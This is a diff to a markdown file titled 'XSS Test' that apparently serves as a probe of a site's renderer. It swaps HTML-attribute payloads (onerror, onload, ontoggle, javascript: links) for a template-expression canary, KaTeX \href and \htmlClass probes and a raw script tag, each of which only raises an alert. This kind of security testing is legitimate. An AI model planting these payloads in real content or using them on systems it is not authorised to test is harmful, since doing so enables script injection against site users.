@@ -1,22 +1,16 @@
 ---
 title: "XSS Test"
-description: "rendered xss probe"
+description: "rendered xss probe r2"
 ---
 
 XSSPROBESTART
 
-<img src="x" onerror="alert('XSSIMG-'+document.domain)" data-marker="imgerr" />
+ExprCanary: {7*7}
 
-<svg onload="alert('XSSSVG-'+document.domain)" data-marker="svgload" />
+KatexHref: $\href{javascript:alert('XSSKATEX')}{KTXCLICKME}$
 
-<a href="javascript:alert('XSSAHREF')" data-marker="ahref">linkA</a>
+KatexHtml: $\htmlClass{xsscls}{\text{KTXHTML}}$
 
-<details open ontoggle="alert('XSSDETAILS')" data-marker="dets"><summary>open</summary>body</details>
-
-<iframe src="javascript:alert('XSSIFRAME')" data-marker="iframe" />
-
-<p data-marker="onmouse" onmouseover="alert('XSSMOUSE')">hover me</p>
-
-[mdlinkjs](javascript:alert('XSSMDLINK'))
+ScriptTag: <script>alert('XSSSCRIPT-'+document.domain)</script>
 
 XSSPROBEEND
